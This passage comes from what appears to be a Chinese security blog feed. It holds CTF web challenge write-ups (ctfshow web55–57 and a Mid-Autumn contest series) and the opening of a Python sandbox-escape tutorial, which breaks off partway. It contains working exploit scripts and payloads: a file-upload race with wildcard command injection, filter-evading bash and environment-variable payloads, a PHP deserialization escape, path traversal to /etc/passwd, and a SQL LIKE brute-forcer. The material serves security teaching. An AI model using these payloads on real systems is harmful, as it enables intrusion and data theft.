class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    $c=$_GET[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!preg_match(<span class="string">&quot;/\;|[a-z]|\`|\%|\x09|\x26|\&gt;|\&lt;/i&quot;</span>, $c))&#123;</span><br><span class="line">        system($c);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><p>和红包题一样，exp:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"></span><br><span class="line">url1=<span class="string">&#x27;http://0a73a501-052c-43c7-b811-01cd759d416a.chall.ctf.show/?c=.+/???/????????[@-[]&#x27;</span></span><br><span class="line">url=<span class="string">&#x27;http://0a73a501-052c-43c7-b811-01cd759d416a.chall.ctf.show/&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">post</span>():</span></span><br><span class="line">    files=&#123;</span><br><span class="line">    <span class="string">&#x27;upload&#x27;</span>:<span class="string">&#x27;#!/bin/sh\necho 1433223\ncat flag.php&#x27;</span></span><br><span class="line">    &#125;</span><br><span class="line">    r=requests.post(url,files=files)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">req</span>():</span></span><br><span class="line">    r=requests.get(url1)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;1433223&#x27;</span> <span class="keyword">in</span> r.text:</span><br><span class="line">        print(r.text)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">50</span>):</span><br><span class="line">    threading.Thread(target=post,args=()).start()</span><br><span class="line">    threading.Thread(target=req,args=()).start()</span><br></pre></td></tr></table></figure><p><code>[@-[]</code>代表是大写字母的通配符</p><h3 id="web56"><a href="#web56" class="headerlink" title="web56"></a>web56</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    $c=$_GET[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!preg_match(<span class="string">&quot;/\;|[a-z]|[0-9]|\\$|\(|\&#123;|\&#x27;|\&quot;|\`|\%|\x09|\x26|\&gt;|\&lt;/i&quot;</span>, $c))&#123;</span><br><span class="line">        system($c);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>和web55一样</p><h3 id="web57"><a href="#web57" class="headerlink" title="web57"></a>web57</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//flag in 36.php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    $c=$_GET[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!preg_match(<span class="string">&quot;/\;|[a-z]|[0-9]|\`|\|\#|\&#x27;|\&quot;|\`|\%|\x09|\x26|\x0a|\&gt;|\&lt;|\.|\,|\?|\*|\-|\=|\[/i&quot;</span>, $c))&#123;</span><br><span class="line">        system(<span class="string">&quot;cat &quot;</span>.$c.<span class="string">&quot;.php&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><p>自己测得下面的payload在bash里可以，在system函数不行：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$((((_++)),$_+$_+$_+$_+$_+$_+$_+$_+$_+$_+$_+$_+$_+$_+$_+$_+$_+$_+$_+$_+$_+$_+$_+$_+$_+$_+$_+$_+$_+$_+$_+$_+$_+$_+$_+$_))</span><br><span class="line"></span><br><span class="line">$[((_++)),$_+$_+$_+$_+$_+$_+$_+$_+$_+$_+$_+$_+$_+$_+$_+$_+$_+$_+$_+$_+$_+$_+$_+$_+$_+$_+$_+$_+$_+$_+$_+$_+$_+$_+$_+$_]</span><br></pre></td></tr></table></figure><p>正确的解法是：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$((~$(($((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))))))</span><br></pre></td></tr></table></figure><p>记下大概思路：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$(())   &#x3D;&#x3D;&gt; 0</span><br><span class="line">$((~$(())))   &#x3D;&#x3D;&gt; -1</span><br><span class="line">$(($((~$(())))$((~$(())))))  &#x3D;&#x3D;&gt; -2</span><br><span class="line">$((~-37))   &#x3D;&#x3D;&gt; 36</span><br></pre></td></tr></table></figure><h2 id="月饼杯"><a href="#月饼杯" class="headerlink" title="月饼杯"></a>月饼杯</h2><h3 id="web1-此夜圆"><a href="#web1-此夜圆" class="headerlink" title="web1_此夜圆"></a>web1_此夜圆</h3><p>源码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">a</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line"><span class="keyword">public</span> $uname;</span><br><span class="line"><span class="keyword">public</span> $password;</span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params">$uname,$password</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">$this</span>-&gt;uname=$uname;</span><br><span class="line"><span class="keyword">$this</span>-&gt;password=$password;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;password===<span class="string">&#x27;yu22x&#x27;</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&#x27;flag.php&#x27;</span>);</span><br><span class="line"><span class="keyword">echo</span> $flag;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;wrong password&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">filter</span>(<span class="params">$string</span>)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> str_replace(<span class="string">&#x27;Firebasky&#x27;</span>,<span class="string">&#x27;Firebaskyup&#x27;</span>,$string);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$uname=$_GET[<span class="number">1</span>];</span><br><span class="line">$password=<span class="number">1</span>;</span><br><span class="line">$ser=filter(serialize(<span class="keyword">new</span> a($uname,$password)));</span><br><span class="line">$test=unserialize($ser);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>反序列化字符逃逸，由于是变长，因此必须添加<code>&quot;</code>把前面的闭合了，判断需添加的字符串：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;;s:8:&quot;password&quot;;s:5:&quot;yu22x&quot;;&#125;</span><br></pre></td></tr></table></figure><p>列方程：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">11n &#x3D; 9n+ 30 +k</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; n&#x3D;15  k&#x3D;0</span><br></pre></td></tr></table></figure><p>构造payload:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?1&#x3D;FirebaskyFirebaskyFirebaskyFirebaskyFirebaskyFirebaskyFirebaskyFirebaskyFirebaskyFirebaskyFirebaskyFirebaskyFirebaskyFirebaskyFirebasky&quot;;s:8:&quot;password&quot;;s:5:&quot;yu22x&quot;;&#125;</span><br></pre></td></tr></table></figure><h3 id="web2-故人心"><a href="#web2-故人心" class="headerlink" title="web2_故人心"></a>web2_故人心</h3><p>源码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">$a=$_GET[<span class="string">&#x27;a&#x27;</span>];</span><br><span class="line">$b=$_GET[<span class="string">&#x27;b&#x27;</span>];</span><br><span class="line">$c=$_GET[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">$url[<span class="number">1</span>]=$_POST[<span class="string">&#x27;url&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(is_numeric($a) <span class="keyword">and</span> strlen($a)&lt;<span class="number">7</span> <span class="keyword">and</span> $a!=<span class="number">0</span> <span class="keyword">and</span> $a**<span class="number">2</span>==<span class="number">0</span>)&#123;</span><br><span class="line">    $d = ($b==hash(<span class="string">&quot;md2&quot;</span>, $b)) &amp;&amp; ($c==hash(<span class="string">&quot;md2&quot;</span>,hash(<span class="string">&quot;md2&quot;</span>, $c)));</span><br><span class="line">    <span class="keyword">if</span>($d)&#123;</span><br><span class="line">             highlight_file(<span class="string">&#x27;hint.php&#x27;</span>);</span><br><span class="line">             <span class="keyword">if</span>(filter_var($url[<span class="number">1</span>],FILTER_VALIDATE_URL))&#123;</span><br><span class="line">                $host=parse_url($url[<span class="number">1</span>]);</span><br><span class="line">                print_r($host); </span><br><span class="line">                <span class="keyword">if</span>(preg_match(<span class="string">&#x27;/ctfshow\.com$/&#x27;</span>,$host[<span class="string">&#x27;host&#x27;</span>]))&#123;</span><br><span class="line">                    print_r(file_get_contents($url[<span class="number">1</span>]));</span><br><span class="line">                &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                    <span class="keyword">echo</span> <span class="string">&#x27;差点点就成功了！&#x27;</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">&#x27;please give me url!!!&#x27;</span>;</span><br><span class="line">            &#125;     </span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;想一想md5碰撞原理吧?!&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;第一个都过不了还想要flag呀?!&#x27;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>第一关试就完事了，猜测是精度问题，后来才知道php小数点后超过161位做平方运算时会被截断，但是超过323位又会失效。用科学计数法来代替，即 <code>1e-162 到 1e-323</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a&#x3D;1e-300</span><br></pre></td></tr></table></figure><p>第二关md2弱比较，写脚本跑吧，robots里有提示</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">xxxxx024452    hash(&quot;md2&quot;,$b)</span><br><span class="line">xxxxxx48399    hash(&quot;md2&quot;,hash(&quot;md2&quot;,$b))</span><br></pre></td></tr></table></figure><p>脚本：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Hash <span class="keyword">import</span> MD2</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">md2</span>(<span class="params">s</span>):</span></span><br><span class="line">    obj = MD2.new()</span><br><span class="line">    obj.update(s.encode())</span><br><span class="line">    <span class="keyword">return</span> obj.hexdigest()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">check</span>(<span class="params">id</span>):</span></span><br><span class="line">    <span class="comment"># print(id)</span></span><br><span class="line">    d =<span class="string">&#x27;0e&#x27;</span>+str(id)+<span class="string">&#x27;48399&#x27;</span></span><br><span class="line">    enc=md2(md2(d))</span><br><span class="line">    <span class="keyword">if</span> enc[<span class="number">0</span>:<span class="number">2</span>]==<span class="string">&#x27;0e&#x27;</span> <span class="keyword">and</span> enc[<span class="number">2</span>:<span class="number">-1</span>].isdigit():</span><br><span class="line">        print(d)</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1000</span>,<span class="number">9999</span>):</span><br><span class="line">    check(i)</span><br></pre></td></tr></table></figure><p>跑出来</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">b &#x3D; 0e652024452   c &#x3D; 0e603448399</span><br></pre></td></tr></table></figure><p>最后一关，php会将不认识的协议当作目录，payload:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?a&#x3D;1e-300&amp;b&#x3D;0e652024452&amp;c&#x3D;0e603448399</span><br><span class="line">POST: url&#x3D;a:&#x2F;&#x2F;ctfshow.com&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;etc&#x2F;passwd</span><br></pre></td></tr></table></figure><p>需要跳5层 <code>a</code>一层 <code>ctfshow.com</code>一层</p><h3 id="web3-莫负婵娟"><a href="#web3-莫负婵娟" class="headerlink" title="web3_莫负婵娟"></a>web3_莫负婵娟</h3><p>查看源码发现：</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;!-- username yu22x --&gt;</span><br><span class="line">&lt;!-- SELECT * FROM users where username like binary(&#x27;$username&#x27;) and password like binary(&#x27;$password&#x27;)--&gt;</span><br></pre></td></tr></table></figure><p>fuzz一下，发现过滤了：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#39; # \ %</span><br></pre></td></tr></table></figure><p>都过滤了，闭合sql语句注入应该不行了，再看下发现比较时是<code>like</code>，想到sql通配符</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">%：用来表示任意多个字符，可以为0</span><br><span class="line"></span><br><span class="line">_  : 用来表示任意单个字符</span><br></pre></td></tr></table></figure><p>发现当有32个<code>_</code>时状态改变了</p><p><img src="/2020/02/17/ctfshow%E9%83%A8%E5%88%86%E9%A2%98%E7%9B%AEwriteup/QQ%E6%88%AA%E5%9B%BE20200928142411.png"></p><p>我们可以写个脚本跑下密码</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"></span><br><span class="line">s = string.ascii_lowercase + string.ascii_uppercase + string.digits</span><br><span class="line">flag = <span class="string">&#x27;&#x27;</span></span><br><span class="line">url = <span class="string">&#x27;http://04c9162c-4824-4247-8d26-743472a723a6.chall.ctf.show/login.php&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">100</span>):</span><br><span class="line">    f = flag</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> s:</span><br><span class="line">        print(i,j)</span><br><span class="line">        p = flag+j+(<span class="number">32</span>-i)*<span class="string">&#x27;_&#x27;</span></span><br><span class="line">        data = &#123;<span class="string">&#x27;username&#x27;</span>:<span class="string">&#x27;yu22x&#x27;</span>,<span class="string">&#x27;password&#x27;</span>:p&#125;</span><br><span class="line">        r = requests.post(url, data=data)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;wrong&#x27;</span> <span class="keyword">not</span> <span class="keyword">in</span> r.text:</span><br><span class="line">            flag+=j</span><br><span class="line">            print(flag)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">if</span> flag== f:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">print(flag)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 67815b0c009ee970fe4014abaa3Fa6A0</span></span><br></pre></td></tr></table></figure><p>注意最后一位跑出来的时候会登录成功，状态不一样</p><p>登陆进去发现是个curl的功能，猜测是命令注入，fuzz一下 过滤了</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">小写字母 | () &#x2F; \ &#96; * , &lt; &gt; !</span><br></pre></td></tr></table></figure><p>但是 这些没过滤</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">? $ &#123; &#125; :</span><br></pre></td></tr></table></figure><p>大写字母没过滤，而一些linux的常量都是大写字母，如:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$PATH  linux环境变量</span><br><span class="line">$HOME  用户主目录</span><br><span class="line">$PWD   当前路径</span><br></pre></td></tr></table></figure><p>可以直接带出这变量</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ip&#x3D;1.1.1.1:9000?$PATH</span><br></pre></td></tr></table></figure><p><img src="/2020/02/17/ctfshow%E9%83%A8%E5%88%86%E9%A2%98%E7%9B%AEwriteup/QQ%E6%88%AA%E5%9B%BE20200928151434.png"></p><p>然后截取拼接就行</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ip&#x3D;127.0.0.1;$&#123;PATH:7:1&#125;$&#123;PATH:8:1&#125;$&#123;HOME:12:1&#125; ????.???</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> CTFshow </tag>
            
            <tag> wirteup </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Python沙箱逃逸</title>
      <link href="2020/02/16/Python%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8/"/>
      <url>2020/02/16/Python%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8/</url>
      
        <content type="html"><![CDATA[<p>本篇博客主要介绍了python沙箱逃逸的相关内容！</p><a id="more"></a><h2 id="沙箱逃逸的概念"><a href="#沙箱逃逸的概念" class="headerlink" title="沙箱逃逸的概念"></a>沙箱逃逸的概念</h2><p>沙箱逃逸，就是在给我们的一个代码执行环境下(Oj或使用socat生成的交互式终端),脱离种种过滤和限制,最终成功拿到shell权限的过程。</p><h2 id="命名空间"><a href="#命名空间" class="headerlink" title="命名空间"></a>命名空间</h2><p>名空间是名称到对象的映射；按照变量定义的位置，有以下分类：</p><ul><li>Local，局部命名空间，每个函数所拥有的命名空间，记录了函数中定义的所有变量</li><li>Global，全局命名空间，每个模块加载执行时创建的，记录了模块中定义的变量</li><li>Built-in，内建命名空间，任何模块均可访问</li></ul><p>上述三种命名空间的生命周期如下：</p><ul><li>Local，在函数调用时才被创建，当函数返回结果或抛出异常时被删除</li><li>Global，在模块加载时被创建，一直保留到python解释器退出</li><li>Built-in，在python解释器启动时创建，一直保留到python解释器退出</li></ul><p>像<code>len</code>，<code>print</code>这些函数，我们并不需要引入模块而直接可以去调用，因此这些函数都来自内建命名空间</p><h2 id="常用的内建属性"><a href="#常用的内建属性" class="headerlink" title="常用的内建属性"></a>常用的内建属性</h2><h3 id="class"><a href="#class" class="headerlink" title="__class__"></a><code>__class__</code></h3><p><code>__class__</code>同<code>type()</code>，都可查看对象所在的类：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="class"><span class="keyword">class</span> <span class="title">Student</span>():</span></span><br><span class="line"><span class="meta">... </span>    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self, name</span>):</span></span><br><span class="line"><span class="meta">... </span>            self.name = name</span><br><span class="line"><span class="meta">... </span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>stu = Student(<span class="string">&#x27;ling&#x27;</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>type(stu)</span><br><span class="line">&lt;<span class="class"><span class="keyword">class</span> &#x27;<span class="title">__main__</span>.<span class="title">Student</span>&#x27;&gt;</span></span><br><span class="line"><span class="class">&gt;&gt;&gt; <span class="title">stu</span>.<span class="title">__class__</span></span></span><br><span class="line"><span class="class">&lt;<span class="title">class</span> &#x27;<span class="title">__main__</span>.<span class="title">Student</span>&#x27;&gt;</span></span><br><span class="line"><span class="class">&gt;&gt;&gt; </span></span><br></pre></td></tr></table></figure><h3 id="base"><a href="#base" class="headerlink" title="__base__"></a><code>__base__</code></h3><p>可以获取类的一个基类，一般情况下是object，有时不是，例如继承类的时候：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="class"><span class="keyword">class</span> <span class="title">Student</span>():</span></span><br><span class="line"><span class="meta">... </span>    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self, name</span>):</span></span><br><span class="line"><span class="meta">... </span>            self.name = name</span><br><span class="line"><span class="meta">... </span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>stu = Student(<span class="string">&#x27;ling&#x27;</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>stu.__class__.__base__</span><br><span class="line">&lt;<span class="class"><span class="keyword">class</span> &#x27;<span class="title">object</span>&#x27;&gt;</span></span><br><span class="line"><span class="class"></span></span><br><span class="line"><span class="class">&gt;&gt;&gt; <span class="title">class</span> <span class="title">Student2</span>(<span class="params">Student</span>):</span></span><br><span class="line"><span class="meta">... </span>    <span class="keyword">pass</span></span><br><span class="line"><span class="meta">... </span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>stu2 = Student2()</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>stu2.__class__.__base__</span><br><span class="line">&lt;<span class="class"><span class="keyword">class</span> &#x27;<span class="title">__main__</span>.<span class="title">Student</span>&#x27;&gt;</span></span><br></pre></td></tr></table></figure><h3 id="mro"><a href="#mro" class="headerlink" title="__mro__"></a><code>__mro__</code></h3><p>以元祖的形式返回整个继承链的关系：</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>stu2.__class__.__mro__</span><br><span class="line">(&lt;class &#x27;__main__.Student2&#x27;&gt;, &lt;class &#x27;__main__.Student&#x27;&gt;, &lt;class &#x27;object&#x27;&gt;)</span><br></pre></td></tr></table></figure><p>上面显示了<code>Student2</code>继承自<code>Student</code>，<code>Student</code>继承自<code>object</code>；因此可以直接获取object类：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>stu2.__class__.__mro__[<span class="number">-1</span>]</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>&lt;<span class="class"><span class="keyword">class</span> &#x27;<span class="title">object</span>&#x27;&gt;</span></span><br></pre></td></tr></table></figure><h3 id="subclasses"><a href="#subclasses" class="headerlink" title="__subclasses__()"></a><code>__subclasses__()</code></h3><p>上述两种方法可以得到object类，但如果代码中没有Student类，我们可以用利用python自带的对象(一切皆为对象)：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>[].__class__.__base__</span><br><span class="line">&lt;<span class="class"><span class="keyword">class</span> &#x27;<span class="title">object</span>&#x27;&gt;</span></span><br><span class="line"><span class="class">&gt;&gt;&gt; &#x27;&#x27;.<span class="title">__class__</span>.<span class="title">__base__</span></span></span><br><span class="line"><span class="class">&lt;<span class="title">class</span> &#x27;<span class="title">object</span>&#x27;&gt;</span></span><br><span 